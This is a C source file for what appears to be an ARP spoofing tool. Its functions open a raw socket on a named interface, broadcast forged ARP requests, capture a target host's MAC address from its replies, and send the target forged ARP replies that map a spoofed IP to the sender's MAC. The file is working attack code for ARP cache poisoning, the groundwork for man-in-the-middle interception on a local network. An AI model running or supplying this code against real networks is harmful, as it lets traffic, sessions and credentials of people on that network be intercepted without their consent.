#include "ARP_Spoofer.h"

int 
init_spoofing(const char* const if_name)
{
    __CheckNull(if_name);

    __CheckErr(if_nametoindex(if_name) == 0,
    "INTERFACE NOT EXISTS: make sure interface name is correct\n");

    int sock_raw;
    __CheckErr((sock_raw = socket(AF_PACKET, SOCK_RAW, htons(ETH_P_ARP))) < 0, 
        "Socket Initilizing Failed\n");

    __CheckErr(setsockopt(sock_raw, SOL_SOCKET, SO_BINDTODEVICE, if_name, strlen(if_name)) < 0,
        "Socket Option Setting Failed\n");

    struct timeval tv;
    tv.tv_sec = RECV_TIME_OUT;
    tv.tv_usec = 0;
    __CheckErr(setsockopt(sock_raw, SOL_SOCKET, SO_RCVTIMEO, (const char*) &tv, sizeof(tv)) < 0,
        "Socket Option Setting Failed\n");

    LOG(">> Spoofer Initiliized Successfully\n");
    
    return sock_raw;
}


void 
broadcast_spoofed_ip(MAC my_mac, IP spoofed_ip, IP target_ip, struct sockaddr_ll* sending_if, int sock_fd)
{
    struct arppkt* pkt = make_arp_pkt(my_mac, spoofed_ip, BROADCAST, target_ip, ARPOP_REQUEST);
    __CheckNull(pkt);

    struct ethfrm* frm = make_eth_arp_frm(my_mac, BROADCAST, pkt);
    __CheckNull(frm);

    __CheckErr((sendto(sock_fd, frm, sizeof(*frm), 0, (const struct sockaddr*) sending_if, sizeof(*sending_if)) < 0) ,
        "Sending Spoofed IP To Broadcast Failed\n");
    
    LOG(">> Spoofed IP Broadcated Successfully\n");

    free(frm);
    free(pkt);
}

void
get_target_mac(int sock_fd, IP target_ip, MAC target_mac)
{
    uint8_t buffer[ETHER_MAX_LEN];

    char  str_ip[IP_LEN*4];
    sprintf(str_ip, IP_FORMAT(target_ip));
    
    LOG(">> Listening To Get Mac Address of %s ...\n", str_ip);

    while(1)
    {
        __CheckErr((recv(sock_fd, buffer, ETHER_MAX_LEN, 0)) < 0,
            "TIME OUT: make sure host is up\n");

        struct ethfrm* eth = (struct ethfrm*) buffer;

        if(eth->eth_hdr.h_proto != htons(ETH_P_ARP) 
            || eth->eth_pld.arp_hdr.ar_op != htons(ARPOP_REPLY)
            || memcmp(&eth->eth_pld.arp_pld.SPA, target_ip, sizeof(IP)))
            continue;
        
        memcpy(target_mac, eth->eth_pld.arp_pld.SHA, sizeof(MAC));

        char str_mac[MAC_LEN*3];
        sprintf(str_mac, MAC_FORMAT(target_mac));

        LOG(">> Got Target Mac Address Successfully: %s -> %s\n", str_ip , str_mac);

        break;
    }
}

void
send_spoofed_ip(MAC my_mac, IP spoofed_ip, MAC target_mac, IP target_ip, struct sockaddr_ll* sending_if, int sock_fd)
{
    struct arppkt* pkt = make_arp_pkt(my_mac, spoofed_ip, target_mac, target_ip, ARPOP_REPLY);
    __CheckNull(pkt);

    struct ethfrm* frm = make_eth_arp_frm(my_mac, target_mac, pkt);
    __CheckNull(frm);

    // while(1)
    {
        __CheckErr(sendto(sock_fd, frm, sizeof(*frm), 0, (const struct sockaddr*) sending_if, sizeof(*sending_if)) < 0,
            "Sending Spoofed IP To Target Failed\n");

        char str_ip[IP_LEN*4];
        sprintf(str_ip, IP_FORMAT(target_ip));
        LOG(">> Spoofed IP Sent Successfully to %s\n", str_ip);

        // sleep(1);
    }

    free(pkt);
    free(frm);
}

